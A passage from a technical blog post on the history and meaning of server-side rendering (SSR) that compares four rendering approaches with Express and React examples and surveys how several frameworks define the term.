published by Airbnb on November 12, 2013: <a href="https://medium.com/airbnb-engineering/isomorphic-javascript-the-future-of-web-apps-10882b7a2ebc">Isomorphic JavaScript: The Future of Web Apps</a></p><p>The article also includes a practical example that is worth referring to: <a href="https://github.com/spikebrehm/isomorphic-tutorial/tree/b54098ba61f4e766fee8c660e3d074c5eca07dfa">isomorphic-tutorial</a>.</p><p>In addition, the article mentions three predecessors of Isomorphic JavaScript before Rendr. One of them is Mojito, open-sourced by Yahoo! in 2012. The article mentions a beautiful imagination:</p><blockquote><p>Imagine a framework where the first page-load was always rendered server-side, and desktop browsers subsequently just made calls to API endpoints returning JSON or XML, and the client only rendered the changed portions of the page.</p></blockquote><p>It is basically the current mainstream way of working in front-end development.</p><p>Another one is Meteor.js, and the third one is Asana’s <a href="https://web.archive.org/web/20110211193136/https://asana.com/luna">Luna</a>. Luna is quite interesting, and upon closer inspection, its syntax has a bit of a React flavor.</p><p>The term “Isomorphic” was gradually replaced by “Universal” after Michael Jackson’s article in 2015: <a href="https://medium.com/@mjackson/universal-javascript-4761051b7ae9">Universal JavaScript</a>.</p><p>This article mainly suggests that “Universal” better expresses the original intention and is easier for the audience to understand. Therefore, it advocates using “Universal JavaScript” instead of “Isomorphic JavaScript”.</p><h2><span id="mid-summary">Mid-summary</span></h2><p>Up to this point, I have answered a few of my previous questions:</p><blockquote><p>Q: Was the term SSR really not used much before the popularity of SPA and CSR? If so, when did it start?</p></blockquote><p>I’m not sure because I didn’t specifically search for earlier evidence. However, if we look at the search trend for the term SSR, it started to take off around 2012-2013, which is around the same time as the popularity of SPA.</p><p><img src="/img/server-side-rendering-ssr-and-isomorphic/p5.png" alt="SSR Search Trend"></p><blockquote><p>Q: My understanding of SSR basically started with React. Does that mean earlier frameworks like Angular, Ember, or even Backbone didn’t have this issue? If they did, what was their solution called?</p></blockquote><p>They had the same issue, and the solution was also called SSR.</p><p>To be honest, discussing the precise definition of the term SSR doesn’t have much significance. It can be a bit nitpicky, and it’s difficult to reach a conclusion or convince others that “this definition is correct.” The key is to ensure that both parties have a consistent understanding during communication.</p><p>When talking about SSR, many people only focus on the SEO aspect, but if we think a bit more carefully, SSR is needed for more than just SEO.</p><h2><span id="problems-ssr-aims-to-solve">Problems SSR Aims to Solve</span></h2><p>SSR aims to solve the problems caused by CSR, including:</p><ol><li>SEO</li><li>Link previews on various social platforms</li><li>Performance</li><li>User experience</li></ol><p>If CSR is used, since the UI is generated through JavaScript, search engines will only crawl blank HTML. Even if Google executes JavaScript, other search engines may not. Even if all search engines execute JavaScript, you can’t guarantee that the crawled results will be what you want.</p><p>For example, it’s difficult to know when they will finish executing JavaScript. If the API for fetching data takes two seconds to respond, and the search engine only waits for one second after executing JavaScript, the result will still be empty.</p><p>Link previews on social platforms are another problem. The <code>&lt;meta&gt;</code> tags generated on the client side are not useful. Usually, the bots of these social platforms don’t execute JavaScript; they only look at the response. Therefore, the <code>&lt;meta&gt;</code> tags on CSR pages can only be the same and cannot dynamically determine the content based on different pages.</p><p>The third and fourth points can be considered together. Although modern devices generally run fast and can execute JavaScript quickly, in cases where the JavaScript is large and the device is older, executing JavaScript still takes some time.</p><p>When will the user see the UI of a CSR page? They need to download the JavaScript first, and after downloading, it needs to be executed. After executing and updating the DOM, the user can see the complete UI. During the waiting period, the screen is blank. Although some websites show a loading indicator, the overall user experience is not very good.</p><p>If we can get the UI in the initial response, the user experience will be better, and performance will increase. Even on older devices, users can see the UI from the beginning without waiting for JavaScript to finish executing.</p><h2><span id="various-types-of-ssr">Various Types of SSR</span></h2><p>Originally, I only wanted to write this paragraph, but unexpectedly, it turned into a historical archaeology of front-end development.</p><p>In response to the problems caused by CSR mentioned earlier, various solutions have emerged. Each solution is different, and not all problems can be solved at once.</p><h3><span id="type-1-rendering-a-different-template-for-search-engines-and-bots">Type 1: Rendering a different template for search engines and bots</span></h3><p>This solution only solves the problems of SEO and link previews. When the server receives a request from a search engine or a bot from a social platform, it directly uses the original backend template to output the result.</p><p>Like this:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/games/:id'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> userAgent <span class="token operator">=</span> req<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'user-agent'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// Check user agent</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>userAgent<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'Googlebot'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// render the SEO template for the bot</span>    <span class="token keyword">const</span> game <span class="token operator">=</span> <span class="token constant">API</span><span class="token punctuation">.</span><span class="token function">getGame</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">      &lt;html>        &lt;head>          &lt;title></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>game<span class="token punctuation">.</span>title<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/title>          &lt;meta name="description" content="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>game<span class="token punctuation">.</span>desc<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">">        &lt;/head>          &lt;body>            &lt;h1></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>game<span class="token punctuation">.</span>title<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/h1>            &lt;p></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>game<span class="token punctuation">.</span>desc<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/p>          &lt;/body>        &lt;/html>    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// return index.html for regular users</span>    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">'/public/index.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Server is running on port 3000'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>For regular users, the issues of performance and user experience are still not resolved. This solution only addresses SEO and link preview, ensuring that the web page captured by these bots has data.</p><p>I have implemented this approach in my work, and the advantages are that it is simple, fast, and does not interfere with SPA. The disadvantage is that the page seen by the Google bot may be different from what the user sees, which could potentially affect SEO scores. After all, outputting special pages for the Google bot is considered an anti-pattern called cloaking, as mentioned in Google’s official video: <a href="https://www.youtube.com/watch?v=wBO-1ETf_dY&ab_channel=GoogleSearchCentral">Can we serve Googlebot a different page with no ads?</a>. It is recommended to have the exact same page.</p><p>However, compared to not showing anything to the Google bot, this solution is still better.</p><h3><span id="second-approach-pre-rendering-for-search-engines">Second Approach: Pre-rendering for Search Engines</span></h3><p>The most well-known framework for this approach is <a href="https://github.com/prerender/prerender">Prerender</a>. In simple terms, it uses a headless browser like Puppeteer on the server-side to open your page and execute JavaScript, then saves the result as HTML.</p><p>When the search engine requests data, this HTML is served, so both users and bots see the same content.</p><p>I tried it locally and created a simple page using create-react-app:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> logo <span class="token keyword">from</span> <span class="token string">'./logo.svg'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">'./App.css'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> useState<span class="token punctuation">,</span> useEffect <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'render'</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>data<span class="token punctuation">,</span> setData<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'title'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent <span class="token operator">=</span> <span class="token string">'I am new title'</span>     <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://cat-fact.herokuapp.com/facts/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">a</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token function">setData</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token operator">&lt;</span>div className<span class="token operator">=</span><span class="token string">"App"</span><span class="token operator">></span>      <span class="token operator">&lt;</span>header className<span class="token operator">=</span><span class="token string">"App-header"</span><span class="token operator">></span>        <span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token punctuation">&#123;</span>logo<span class="token punctuation">&#125;</span> className<span class="token operator">=</span><span class="token string">"App-logo"</span> alt<span class="token operator">=</span><span class="token string">"logo"</span> <span class="token operator">/</span><span class="token operator">></span>        <span class="token punctuation">&#123;</span>data <span class="token operator">&amp;&amp;</span> data<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=></span> <span class="token punctuation">(</span>          <span class="token operator">&lt;</span>div<span class="token operator">></span><span class="token punctuation">&#123;</span>item<span class="token punctuation">.</span>text<span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>        <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>        <span class="token operator">&lt;</span>a          className<span class="token operator">=</span><span class="token string">"App-link"</span>          href<span class="token operator">=</span><span class="token string">"https://reactjs.org"</span>          target<span class="token operator">=</span><span class="token string">"_blank"</span>          rel<span class="token operator">=</span><span class="token string">"noopener noreferrer"</span>        <span class="token operator">></span>          Learn React          Can you see me now<span class="token operator">?</span>        <span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span>        <span class="token operator">&lt;</span>button onClick<span class="token operator">=</span><span class="token punctuation">&#123;</span>test<span class="token punctuation">&#125;</span><span class="token operator">></span>hello<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span>      <span class="token operator">&lt;</span><span class="token operator">/</span>header<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The main points I wanted to test were:</p><ol><li>Whether the page is still interactive.</li><li>Whether dynamically modified titles are reflected in the results.</li><li>Whether the output includes the results obtained from an API response.</li></ol><p>After prerendering, the output HTML is:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icon<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:5555/favicon.ico<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width,initial-scale=1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>theme-color<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#000000<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>description<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Web site created using create-react-app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>apple-touch-icon<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:5555/logo192.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>manifest<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:5555/manifest.json<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>I am new title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">defer</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>defer<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:5555/static/js/main.21981749.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:5555/static/css/main.f855e6bc.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>noscript</span><span class="token punctuation">></span></span>You need to enable JavaScript to run this app.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>noscript</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App-header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/media/logo.6ce24c58023cc2f8fd88fe9d219db6c6.svg<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App-logo<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>When asked if her husband had any hobbies, Mary Todd Lincoln is said to have replied "cats."<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>Cats make about 100 different sounds. Dogs make only about 10.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>Owning a cat can reduce the risk of stroke and heart attack by a third.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>Most cats are lactose intolerant, and milk can cause painful stomach cramps and diarrhea. It's best to forego the milk and just give your cat the standard: clean, cool drinking water.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>It was illegal to slay cats in ancient Egypt, in large part because they provided the great service of controlling the rat population.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App-link<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://reactjs.org<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>noopener noreferrer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Learn React Can you see me now?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span><span class="token punctuation">></span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The title has changed, and the content is the result of executing <code>useEffect()</code> and rendering after the <code>fetch</code> operation. Clicking the button can also trigger events, so there don’t seem to be any issues.</p><p>If we take a closer look, the rendering process of the prerendered page is similar to a normal React app. The only difference is that the original HTML already contains content, but React still executes once and re-renders the entire page.</p><p>Therefore, the following situation occurs:</p><ol><li>The server response is a complete page with data.</li><li>React starts and performs the initial rendering, at which point the data becomes the initial state, and the page becomes a state without data.</li><li>React mounts the result to the DOM, triggers <code>useEffect</code>, and makes another API call to fetch data.</li><li>The state is updated, and a page with data is rendered.</li></ol><p>This approach still targets search engines only. The difference from the first approach is that the page seen by users and search engines will be more similar, but still not exactly the same. After all, regular users will see a page with no content.</p><p>Can we show the prerendered page to regular users?</p><p>Yes, it is possible, but it may be a bit strange if there is an API involved. As mentioned earlier, the initial state has no data, but the HTML does. Therefore, the page seen by users will be: Has data (due to prerendered HTML) &#x3D;&gt; No data (state initialization) &#x3D;&gt; Has data (API call on the client). This may not provide a good user experience, so it is usually not done.</p><p>The advantage of this approach is that it is convenient. It does not require modifying the original SPA; only a middleware needs to be added on the server-side. However, the implementation is more complex compared to the first approach, and there are many details to consider.</p><h3><span id="third-type-server-rendering-client-app">Third Type: Server Rendering Client App</span></h3><p>This is the type that has been mentioned before: “generating the initial HTML on the server and handing over subsequent operations to the client.” Compared to the previous two types, this is the more ideal SSR and is commonly known as Isomorphic&#x2F;Universal.</p><p>This approach not only solves the SEO problem but also addresses the user experience. When a user visits the website, they can immediately see the rendered result. However, at this point, the page may not be interactive because the JavaScript has not finished executing. It is necessary to wait for the JavaScript to complete execution and attach event handlers before the page can be truly interactive.</p><p>Additionally, since the initial page has already been rendered on the server, there is usually no need to modify the DOM again on the client side. Only attaching the event handlers is required, and this process is called hydration.</p><p>I find this term quite visually descriptive. Imagine that the page output by SSR is “dehydrated,” very flat and dry, with only the visual elements. It cannot be interacted with. When it reaches the client, it needs to inject water into this dry page, add event handlers, and bring the whole page to life, making it interactive.</p><p>However, the drawback of this solution is that it is more complex to implement. One needs to consider API-related issues. For example, if an API call is placed inside a <code>useEffect</code>, it cannot be executed during server rendering, resulting in a page without any data.</p><p>Therefore, it may be necessary to add a function to fetch data for each page, store it in props, and correctly output a page with data during server-side rendering.</p><p>Due to its complexity, this task is usually delegated to frameworks like Next.js, which adopts the approach I mentioned earlier (Pages Router) and adds a <code>getServerSideProps</code> function to the page.</p><p>By the way, the first version of Next.js was released on October 25, 2016.</p><h3><span id="fourth-type-render-at-build-time">Fourth Type: Render at Build Time</span></h3><p>This is a specialized form of SSR tailored for specific product scenarios. The third type mentioned earlier involves rendering for each request, generating the initial page. However, if your page is the same for every user (e.g., the company introduction on an official website), there is no need to do this at runtime; it can be done at build time.</p><p>Therefore, one approach is to render the page during the build process, resulting in much faster speed.</p><p>This method is referred to as Static Site Generation (SSG) in Next.js.</p><h2><span id="how-to-name-the-different-types-of-ssr">How to Name the Different Types of SSR?</span></h2><p>Let’s summarize the four types mentioned earlier:</p><ol><li>Rendering a different template for search engines and bots</li><li>Pre-rendering for search engines</li><li>Server rendering client app</li><li>Render at build time</li></ol><p>Different documents use different names for these types. Let’s take a look at a few examples.</p><h3><span id="webdev">web.dev</span></h3><p>The first document is from web.dev: <a href="https://web.dev/articles/rendering-on-the-web">Rendering on the Web</a>. At the end of the article, there is a spectrum:</p><p><img src="/img/server-side-rendering-ssr-and-isomorphic/p6.png" alt="SSR Spectrum"></p><p>The first type is not specifically mentioned, the second type is more like “CSR with Prerendering,” but not exactly, the third type is “SSR with (Re)hydration,” and the fourth type is “Static SSR.”</p><p>According to this article, the definition of SSR is:</p><blockquote><p>Server-side rendering (SSR): rendering a client-side or universal app to HTML on the server.</p></blockquote><p>So, the first type, which does not render the client-side app on the server, should not be considered as SSR.</p><h3><span id="nextjs">Next.js</span></h3><p>The second document is from the official Next.js documentation: <a href="https://nextjs.org/docs/pages/building-your-application/rendering">Building Your Application - Rendering</a>.</p><p>Here, the third type is referred to as SSR, and the fourth type is called SSG. The definition here is slightly different again. It refers to the process of “generating SPA HTML on the server” as pre-rendering:</p><blockquote><p>By default, Next.js pre-renders every page. This means that Next.js generates HTML for each page in advance, instead of having it all done by client-side JavaScript. Pre-rendering can result in better performance and SEO.</p></blockquote><p>And SSR specifically refers to “generating HTML for each request” to differentiate it from SSG.</p><h3><span id="nuxtjs">Nuxt.js</span></h3><p>Let’s start with Nuxt.js: <a href="https://nuxt.com/docs/guide/concepts/rendering">link</a></p><p>In the documentation, the third type is referred to as “Universal Rendering,” which I think is a good term:</p><blockquote><p>To not lose the benefits of the client-side rendering method, such as dynamic interfaces and page transitions, the Client (browser) loads the JavaScript code that runs on the Server in the background once the HTML document has been downloaded. The browser interprets it again (hence Universal rendering) and Vue.js takes control of the document and enables interactivity.</p></blockquote><p>As for the definition of SSR, it doesn’t seem to be explicitly stated, but based on the following sentence:</p><blockquote><p>This step is similar to traditional server-side rendering performed by PHP or Ruby applications.</p></blockquote><p>It should be anything that involves “rendering on the server” can be called SSR.</p><h3><span id="angular">Angular</span></h3><p>Now let’s look at Angular: <a href="https://angular.io/guide/ssr">link</a></p><p>Their definition of SSR is:</p><blockquote><p>Server-side rendering (SSR) is a process that involves rendering pages on the server, resulting in initial HTML content which contains initial page state.</p></blockquote><p>This definition seems similar to the previous one, as long as it involves “rendering pages on the server,” it can be called SSR.</p><h2><span id="summary-of-ssr">Summary of SSR</span></h2><p>Now that I’ve written up to this point, I have some thoughts on SSR.</p><p>To be honest, I think I may have initially made the problem more complicated. SSR simply refers to “rendering on the server,” so as long as it meets this requirement, it can indeed be called SSR.</p><p>Originally, I only intended to write about the different SSR solutions mentioned earlier, but before I started writing, I became curious about the definition of SSR, which led to the introductory paragraphs exploring its history.</p><p>What’s more important is whether we can answer the questions of what problems SSR aims to solve, how to solve them, and the pros and cons of each solution. Not every webpage requires Next.js to achieve SSR; we should choose the appropriate technology based on the context.</p><p>Next, let’s talk about the present and the future.</p><h2><span id="maximizing-performance-and-building-faster-webpages">Maximizing Performance and Building Faster Webpages</span></h2><p>The third 